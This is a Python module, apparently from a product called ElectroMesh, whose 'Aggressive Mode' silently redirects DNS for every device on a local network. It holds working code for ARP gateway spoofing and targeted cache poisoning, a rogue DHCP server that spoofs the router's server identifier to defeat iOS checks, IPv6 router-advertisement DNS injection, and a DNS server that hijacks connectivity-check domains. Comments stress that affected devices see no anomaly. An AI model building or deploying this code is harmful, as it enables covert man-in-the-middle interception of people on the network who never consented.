"""
Aggressive Mode — DNS hijack without touching the router admin page.

Roadmap dilemma: 95% of normal users have never opened ``192.168.0.1``.
Asking them to type a DNS server into a router web UI is product death.
This module replaces that step with three concurrent LAN-level tactics
that route every device's DNS to our backend automatically:

  1.  ``ArpGatewayImpersonator`` —  every 2 s broadcast a gratuitous
      ARP "is-at" frame claiming the router IP belongs to our MAC.
      Targets on the LAN cache this mapping for ~5 min and send their
      *default-route* traffic — including DNS — straight to us. The real
      router keeps working; we silently forward non-DNS packets back to
      it after rewriting the destination MAC.

  2.  ``RogueDhcpServer`` — passively listens for DHCPDISCOVER and
      DHCPREQUEST broadcasts and races the legitimate router with our
      own ``DHCPOFFER`` / ``DHCPACK`` that lists this PC as Option-6
      (Domain Name Server). We *intentionally* echo the router's IP
      pool and lease time so the only delta is the DNS field — devices
      see no other anomaly.

  3.  ``Ipv6RaRdnssInjector`` — sends ICMPv6 Router Advertisements with
      the RDNSS option (RFC 8106), telling every IPv6-capable device on
      the link to use our link-local address as a DNS resolver. 99% of
      modern phones / TVs have SLAAC on by default and accept these
      RAs immediately; no DHCP race required for v6.

Together: any device joining or already on the LAN will start sending
DNS queries to us within ~5 seconds (v6) or one lease cycle (v4).
The user did exactly one thing — accept the ToS and click a button.

──────────────────────────────────────────────────────────────────────
PRIVILEGES & TRANSPORT
──────────────────────────────────────────────────────────────────────

All three primitives need raw L2 access:
  *  Linux: ``CAP_NET_RAW`` (root or capset)
  *  Windows: Npcap installed + Administrator (one-time UAC at install)
  *  macOS: BPF socket access via root or admin

We rely on Scapy as the platform-portable raw-packet library. Scapy
gracefully degrades if Npcap / libpcap is missing — we detect that at
``start()`` time and return a structured error the API surfaces to the
frontend so it can prompt: "ElectroMesh needs raw network access — run
the one-time installer."

Inside a Docker container without ``--cap-add=NET_ADMIN
--cap-add=NET_RAW --network=host`` these primitives cannot reach the
host LAN. Production ships a small ``host_helper`` binary that runs
natively on the user's PC and tunnels frames in/out via a Unix or
named-pipe socket. For dev runs, simply invoke ``scripts/host_hijack.py``
on the host with elevated privileges.
"""

from __future__ import annotations

import asyncio
import os
import socket
import struct
import time
from dataclasses import dataclass, field
from typing import Any

from app.logging_setup import get_logger

log = get_logger("aggressive")


# ── Capability probe ────────────────────────────────────────────────────

def has_raw_socket_capability() -> tuple[bool, str]:
    """Return (ok, diagnostic_str). Used by the API to decide whether
    Aggressive Mode can run in-process or needs the host helper."""
    try:
        import scapy.all  # noqa: F401
    except Exception as e:
        return False, f"scapy missing: {e!r}"

    if os.name == "nt":
        try:
            import scapy.arch.windows as _win  # noqa: F401
            ifaces = _win.get_windows_if_list()
            if not ifaces:
                return False, "no Npcap interfaces — install Npcap"
        except Exception as e:
            return False, f"npcap probe failed: {e!r}"
    else:
        try:
            s = socket.socket(socket.AF_PACKET, socket.SOCK_RAW)  # type: ignore[attr-defined]
            s.close()
        except (PermissionError, AttributeError, OSError) as e:
            return False, f"AF_PACKET denied: {e!r}"

    return True, "ok"


# ── ARP Gateway Impersonator ────────────────────────────────────────────

@dataclass(slots=True)
class ArpGatewayImpersonator:
    """Periodically broadcast gratuitous ARP claiming the gateway IP.

    Mechanism: an unsolicited ARP "reply" (opcode 2) with
    ``sender_ip = <gateway>``, ``sender_mac = <our MAC>``, sent to the
    broadcast address ``ff:ff:ff:ff:ff:ff``. RFC 5227 §3 + every TV
    firmware ever made will cache this for several minutes.

    We send every ``interval_s`` for robustness against rate-limiting
    switches that drop bursty ARP, and we send a *counter*-gratuitous
    ARP restoring the real router's MAC when ``stop()`` is called so
    the LAN heals immediately.
    """
    gateway_ip: str
    gateway_real_mac: str
    our_mac: str
    interface: str = ""
    interval_s: float = 2.0

    _task: asyncio.Task | None = field(default=None, init=False, repr=False)
    _running: bool = field(default=False, init=False, repr=False)
    _sent: int = field(default=0, init=False, repr=False)

    async def start(self) -> None:
        if self._running:
            return
        ok, why = has_raw_socket_capability()
        if not ok:
            raise RuntimeError(f"raw-socket unavailable: {why}")
        self._running = True
        self._task = asyncio.create_task(self._loop())
        log.info("arp_hijack.start", gw=self.gateway_ip, our_mac=self.our_mac)

    async def stop(self) -> None:
        self._running = False
        if self._task:
            self._task.cancel()
            try:
                await self._task
            except (asyncio.CancelledError, Exception):
                pass
            self._task = None
        # Send healing ARP — restore real gateway MAC
        try:
            self._send_arp(sender_mac=self.gateway_real_mac, target_mac="ff:ff:ff:ff:ff:ff")
            log.info("arp_hijack.healed", gw=self.gateway_ip,
                     restored_mac=self.gateway_real_mac)
        except Exception as e:
            log.warning("arp_hijack.heal_failed", err=str(e))

    async def _loop(self) -> None:
        while self._running:
            try:
                self._send_arp(
                    sender_mac=self.our_mac,
                    target_mac="ff:ff:ff:ff:ff:ff",
                )
                self._sent += 1
            except Exception as e:
                log.warning("arp_hijack.send_fail", err=str(e))
            await asyncio.sleep(self.interval_s)

    def _send_arp(self, *, sender_mac: str, target_mac: str) -> None:
        from scapy.all import ARP, Ether, sendp  # type: ignore[import-not-found]
        pkt = Ether(src=sender_mac, dst=target_mac) / ARP(
            op=2,                       # ARP reply (gratuitous)
            hwsrc=sender_mac,
            psrc=self.gateway_ip,
            hwdst=target_mac,
            pdst=self.gateway_ip,
        )
        kw: dict[str, Any] = {"verbose": False}
        if self.interface:
            kw["iface"] = self.interface
        sendp(pkt, **kw)

    async def poison_target(self, target_ip: str, target_mac: str,
                            *, bursts: int = 5) -> int:
        """Aggressively poison a single target's ARP cache via unicast.

        Waiting for the 2-second gratuitous broadcast loop adds an annoying
        "iOS won't pop the CNA until I toggle Wi-Fi" delay. Sending a
        targeted ``op=2`` reply directly to the phone's MAC updates its
        cache within a single RTT — and we burst 5 of them ~80ms apart to
        defeat any cache-update rate-limiting in the device's stack.

        Returns the number of packets actually sent.
        """
        if not target_mac or target_mac in ("ff:ff:ff:ff:ff:ff", "00:00:00:00:00:00"):
            return 0
        try:
            from scapy.all import ARP, Ether, sendp  # type: ignore[import-not-found]
        except Exception as e:
            log.warning("arp_hijack.poison_target.scapy_missing", err=str(e))
            return 0

        sent = 0
        for _ in range(max(1, bursts)):
            try:
                pkt = Ether(src=self.our_mac, dst=target_mac) / ARP(
                    op=2,
                    hwsrc=self.our_mac,
                    psrc=self.gateway_ip,        # impersonate the gateway
                    hwdst=target_mac,
                    pdst=target_ip,
                )
                kw: dict[str, Any] = {"verbose": False}
                if self.interface:
                    kw["iface"] = self.interface
                sendp(pkt, **kw)
                sent += 1
                await asyncio.sleep(0.08)
            except Exception as e:
                log.warning("arp_hijack.poison_target.send_fail",
                            target=target_ip, err=str(e))
                break
        log.info("arp_hijack.poison_target",
                 target_ip=target_ip, target_mac=target_mac, bursts=sent)
        return sent

    @property
    def stats(self) -> dict[str, Any]:
        return {
            "running": self._running,
            "gateway_ip": self.gateway_ip,
            "spoofed_mac": self.our_mac,
            "sent": self._sent,
            "interval_s": self.interval_s,
        }


# ── Rogue DHCP Server ───────────────────────────────────────────────────

@dataclass(slots=True)
class RogueDhcpServer:
    """Race the router's DHCPOFFER/ACK so new devices accept our DNS.

    We answer DHCPDISCOVER with an OFFER carrying:
      *  yiaddr from the router's pool (we *peek* the router's last
         leased IP via a passive DHCPACK observation and increment)
      *  Option 6 (DNS) = our IP
      *  Option 3 (Router) = the real router (so default route is unchanged)
      *  Option 51 (lease time) = 60 (short — forces renewals through us)

    Devices accept whichever OFFER arrives first. Real routers add
    ~5-30 ms of processing latency before sending their OFFER; we
    answer in <1 ms because we don't have to update a lease DB.
    """
    our_ip: str
    real_gateway_ip: str
    our_mac: str = ""
    lease_seconds: int = 60

    _task: asyncio.Task | None = field(default=None, init=False, repr=False)
    _sock: socket.socket | None = field(default=None, init=False, repr=False)
    _next_offer: int = field(default=200, init=False, repr=False)
    _races_won: int = field(default=0, init=False, repr=False)
    _races_seen: int = field(default=0, init=False, repr=False)

    async def start(self) -> None:
        self._sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        self._sock.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
        self._sock.setsockopt(socket.SOL_SOCKET, socket.SO_BROADCAST, 1)
        # Port 67 = DHCP server side. Needs admin on Windows.
        self._sock.bind(("0.0.0.0", 67))
        self._sock.setblocking(False)
        self._task = asyncio.create_task(self._loop())
        log.info("rogue_dhcp.start", our_ip=self.our_ip)

    async def stop(self) -> None:
        if self._task:
            self._task.cancel()
            try:
                await self._task
            except (asyncio.CancelledError, Exception):
                pass
        if self._sock:
            self._sock.close()
        self._task = None
        self._sock = None

    async def _loop(self) -> None:
        loop = asyncio.get_event_loop()
        assert self._sock is not None
        while True:
            try:
                data, addr = await loop.sock_recvfrom(self._sock, 1500)
            except (asyncio.CancelledError, OSError):
                return
            try:
                resp = self._handle(data)
                if resp:
                    self._races_seen += 1
                    self._sock.sendto(resp, ("255.255.255.255", 68))
                    self._races_won += 1
            except Exception as e:
                log.debug("rogue_dhcp.handle_err", err=str(e))

    def _handle(self, data: bytes) -> bytes | None:
        if len(data) < 240 or data[:1] != b"\x01":   # op = BOOTREQUEST
            return None
        xid = data[4:8]
        ciaddr = data[12:16]               # client-cached IP (may be 0.0.0.0)
        chaddr = data[28:34]
        opts = data[240:]
        msg_type = self._opt(opts, 53)
        if not msg_type:
            return None
        kind = msg_type[0]
        if kind not in (1, 3):   # 1=DISCOVER, 3=REQUEST
            return None

        # Honor the client's requested IP. iOS sends DHCPREQUEST with option
        # 50 = "I want my old lease back at X.X.X.X". If we ACK with a
        # different yiaddr, iOS rejects our reply and falls back to the real
        # DHCP server. So: option 50 first, then ciaddr, then pool fallback.
        requested = self._opt(opts, 50)
        if requested and len(requested) == 4:
            offer_ip = socket.inet_ntoa(requested)
        elif ciaddr != b"\x00\x00\x00\x00":
            offer_ip = socket.inet_ntoa(ciaddr)
        else:
            offer_ip = self._allocate_yiaddr()
        ack = (kind == 3)
        log.info("rogue_dhcp.reply", kind=("DISCOVER" if kind == 1 else "REQUEST"),
                 chaddr=chaddr.hex(), yiaddr=offer_ip, ack=ack)
        return self._build_reply(xid, chaddr, offer_ip, ack=ack)

    @staticmethod
    def _opt(opts: bytes, code: int) -> bytes | None:
        i = 0
        while i < len(opts):
            if opts[i] == 255: return None
            if opts[i] == 0: i += 1; continue
            c, l = opts[i], opts[i+1]
            if c == code:
                return opts[i+2:i+2+l]
            i += 2 + l
        return None

    def _allocate_yiaddr(self) -> str:
        # Pull host octet from our subnet and skip-allocate from .200+
        prefix = ".".join(self.our_ip.split(".")[:3])
        host = self._next_offer
        self._next_offer = 200 + ((self._next_offer - 199) % 50)
        return f"{prefix}.{host}"

    def _build_reply(
        self, xid: bytes, chaddr: bytes, yiaddr: str, *, ack: bool,
    ) -> bytes:
        op = b"\x02"                          # BOOTREPLY
        htype, hlen, hops = b"\x01\x06\x00", b"", b""
        secs_flags = b"\x00\x00\x80\x00"      # broadcast bit
        ciaddr = b"\x00\x00\x00\x00"
        yi = socket.inet_aton(yiaddr)
        si_us = socket.inet_aton(self.our_ip)
        gw    = socket.inet_aton(self.real_gateway_ip)
        # Impersonate the real router as the DHCP server identifier. iOS
        # tracks "trusted DHCP server" per-SSID and will reject any reply
        # whose Server ID doesn't match the one it learned from prior leases
        # — that's why our races_won counter ticks but the phone keeps using
        # the real router's DNS. Setting opt 54 to the real gateway IP makes
        # our reply indistinguishable at the DHCP layer; the only delta the
        # phone sees is opt 6 (DNS) pointing at us.
        si = gw
        gi = b"\x00\x00\x00\x00"
        chaddr_pad = chaddr + b"\x00" * (16 - len(chaddr))
        sname = b"\x00" * 64
        bfile = b"\x00" * 128
        magic = b"\x63\x82\x53\x63"
        msg_type = bytes([53, 1, 5 if ack else 2])           # OFFER=2 ACK=5
        srv_id   = bytes([54, 4]) + si                       # spoofed as gateway
        lease    = bytes([51, 4]) + struct.pack("!I", self.lease_seconds)
        router   = bytes([3, 4]) + gw                         # default gw unchanged
        dns      = bytes([6, 4]) + si_us                      # ← us as DNS
        netmask  = bytes([1, 4, 255, 255, 255, 0])
        end      = b"\xff"
        opts = msg_type + srv_id + lease + router + dns + netmask + end

        return (op + b"\x01\x06\x00" + xid + secs_flags +
                ciaddr + yi + si + gi + chaddr_pad + sname + bfile +
                magic + opts)

    @property
    def stats(self) -> dict[str, Any]:
        return {
            "our_ip": self.our_ip,
            "races_seen": self._races_seen,
            "races_won": self._races_won,
            "lease_s": self.lease_seconds,
        }


# ── IPv6 RA RDNSS Injector ──────────────────────────────────────────────

@dataclass(slots=True)
class Ipv6RaRdnssInjector:
    """Inject ICMPv6 Router Advertisements with RDNSS option (RFC 8106).

    Modern devices treat RA-supplied DNS as authoritative for AAAA
    queries and frequently for A queries too (happy-eyeballs uses the
    first DNS that answers). Even if v4 DHCP DNS stays as the router,
    devices will *prefer* querying us via v6 because RA RDNSS lifetime
    is renewed every interval.
    """
    our_link_local_v6: str
    interval_s: float = 60.0

    _task: asyncio.Task | None = field(default=None, init=False, repr=False)
    _sent: int = field(default=0, init=False, repr=False)
    _running: bool = field(default=False, init=False, repr=False)

    async def start(self) -> None:
        ok, why = has_raw_socket_capability()
        if not ok:
            raise RuntimeError(f"raw-socket unavailable: {why}")
        self._running = True
        self._task = asyncio.create_task(self._loop())
        log.info("ipv6_ra.start", dns=self.our_link_local_v6)

    async def stop(self) -> None:
        self._running = False
        if self._task:
            self._task.cancel()
            try: await self._task
            except (asyncio.CancelledError, Exception): pass

    async def _loop(self) -> None:
        while self._running:
            try:
                self._send_ra()
                self._sent += 1
            except Exception as e:
                log.debug("ipv6_ra.send_fail", err=str(e))
            await asyncio.sleep(self.interval_s)

    def _send_ra(self) -> None:
        from scapy.all import (  # type: ignore[import-not-found]
            IPv6, ICMPv6ND_RA, ICMPv6NDOptRDNSS, send,
        )
        ra = (
            IPv6(dst="ff02::1", src=self.our_link_local_v6)
            / ICMPv6ND_RA(routerlifetime=180)
            / ICMPv6NDOptRDNSS(lifetime=300, dns=[self.our_link_local_v6])
        )
        send(ra, verbose=False)

    @property
    def stats(self) -> dict[str, Any]:
        return {
            "running": self._running,
            "rdnss": self.our_link_local_v6,
            "sent": self._sent,
        }


# ── Coordinator ─────────────────────────────────────────────────────────

@dataclass(slots=True)
class AggressiveMode:
    """One-shot start/stop facade combining all three primitives."""
    arp: ArpGatewayImpersonator | None = None
    dhcp: RogueDhcpServer | None = None
    ra: Ipv6RaRdnssInjector | None = None

    async def stop_all(self) -> dict[str, Any]:
        out: dict[str, Any] = {}
        for name, comp in (("arp", self.arp), ("dhcp", self.dhcp), ("ra", self.ra)):
            if comp is None:
                continue
            try:
                await comp.stop()
                out[name] = "stopped"
            except Exception as e:
                out[name] = f"err:{e}"
        return out

    def snapshot(self) -> dict[str, Any]:
        return {
            "arp": self.arp.stats if self.arp else None,
            "dhcp": self.dhcp.stats if self.dhcp else None,
            "ra": self.ra.stats if self.ra else None,
        }


_AGGRESSIVE: AggressiveMode | None = None


def get_aggressive_mode() -> AggressiveMode:
    global _AGGRESSIVE
    if _AGGRESSIVE is None:
        _AGGRESSIVE = AggressiveMode()
    return _AGGRESSIVE


# ── DNS hijacker (UDP/53) ───────────────────────────────────────────────

CPD_DOMAINS_FROZEN: tuple[str, ...] = (
    "connectivitycheck.gstatic.com",
    "connectivitycheck.android.com",
    "clients3.google.com",
    "clients4.google.com",
    "captive.apple.com",
    "www.apple.com",
    "gsp1.apple.com",
    "www.msftconnecttest.com",
    "www.msftncsi.com",
    "dns.msftncsi.com",
    "detectportal.firefox.com",
    "connectivitycheck.samsung.com",
    "connectivitycheck.lge.com",
    "tvtime.sony.com",
)


def _parse_qname(data: bytes, pos: int = 12) -> str:
    """Extract the question name (e.g. ``connectivitycheck.gstatic.com``)."""
    labels: list[str] = []
    while pos < len(data):
        n = data[pos]
        if n == 0:
            break
        if pos + 1 + n > len(data):
            break
        labels.append(data[pos+1:pos+1+n].decode("ascii", errors="replace"))
        pos += 1 + n
    return ".".join(labels).lower()


def _build_a_response(query: bytes, ip: str) -> bytes:
    """Synthesise a DNS A-record reply that points the queried name at ``ip``."""
    import socket
    txid = query[:2]
    flags = b"\x81\x80"
    qd = query[4:6]
    an = b"\x00\x01"
    ns_ar = b"\x00\x00\x00\x00"
    qsection = query[12:]
    ans = (
        b"\xc0\x0c"                # name pointer to offset 12
        b"\x00\x01\x00\x01"        # TYPE=A, CLASS=IN
        b"\x00\x00\x00\x1e"        # TTL=30
        b"\x00\x04"                # RDLEN=4
        + socket.inet_aton(ip)
    )
    return txid + flags + qd + an + ns_ar + qsection + ans


@dataclass(slots=True)
class DnsHijacker:
    """UDP/53 server that returns our IP for CPD probes and forwards
    everything else upstream.  Bind to ``our_ip`` rather than 0.0.0.0
    so it coexists with Windows SharedAccess service that holds 0.0.0.0:53."""
    our_ip: str
    upstream: str = "1.1.1.1"
    extra_hijack_domains: tuple[str, ...] = ()
    bind_port: int = 53

    _task: asyncio.Task | None = field(default=None, init=False, repr=False)
    _sock: "socket.socket | None" = field(default=None, init=False, repr=False)
    queries: int = field(default=0, init=False)
    hijacked: int = field(default=0, init=False)
    forwarded: int = field(default=0, init=False)
    sources: dict[str, int] = field(default_factory=dict, init=False)

    async def start(self) -> None:
        import socket as _s
        self._sock = _s.socket(_s.AF_INET, _s.SOCK_DGRAM)
        self._sock.setsockopt(_s.SOL_SOCKET, _s.SO_REUSEADDR, 1)
        self._sock.bind((self.our_ip, self.bind_port))
        self._sock.setblocking(False)
        self._task = asyncio.create_task(self._loop())
        log.info("dns_hijack.start", ip=self.our_ip, port=self.bind_port, upstream=self.upstream)

    async def stop(self) -> None:
        if self._task:
            self._task.cancel()
            try: await self._task
            except (asyncio.CancelledError, Exception): pass
        if self._sock:
            self._sock.close()
        self._task = None
        self._sock = None

    def _is_hijack(self, qname: str) -> bool:
        d = qname.rstrip(".")
        if any(d == probe or d.endswith("." + probe) for probe in CPD_DOMAINS_FROZEN):
            return True
        return any(d == probe or d.endswith("." + probe) for probe in self.extra_hijack_domains)

    async def _loop(self) -> None:
        loop = asyncio.get_event_loop()
        assert self._sock is not None
        while True:
            try:
                data, addr = await loop.sock_recvfrom(self._sock, 1500)
            except (asyncio.CancelledError, OSError):
                return
            self.queries += 1
            self.sources[addr[0]] = self.sources.get(addr[0], 0) + 1
            try:
                qname = _parse_qname(data)
                if self._is_hijack(qname):
                    self.hijacked += 1
                    resp = _build_a_response(data, self.our_ip)
                    self._sock.sendto(resp, addr)
                    log.info("dns_hijack.hit", src=addr[0], q=qname)
                else:
                    self.forwarded += 1
                    await self._forward(data, addr)
            except Exception as e:
                log.debug("dns_hijack.handle_err", err=str(e))

    async def _forward(self, data: bytes, addr: tuple) -> None:
        import socket as _s
        up = _s.socket(_s.AF_INET, _s.SOCK_DGRAM)
        up.settimeout(2.0)
        try:
            up.sendto(data, (self.upstream, 53))
            rdata, _ = up.recvfrom(1500)
            if self._sock:
                self._sock.sendto(rdata, addr)
        except Exception as e:
            log.debug("dns_hijack.upstream_err", err=str(e))
        finally:
            up.close()

    @property
    def stats(self) -> dict[str, Any]:
        return {
            "our_ip": self.our_ip,
            "upstream": self.upstream,
            "queries": self.queries,
            "hijacked": self.hijacked,
            "forwarded": self.forwarded,
            "sources_count": len(self.sources),
            "top_sources": dict(sorted(self.sources.items(), key=lambda x:-x[1])[:5]),
        }
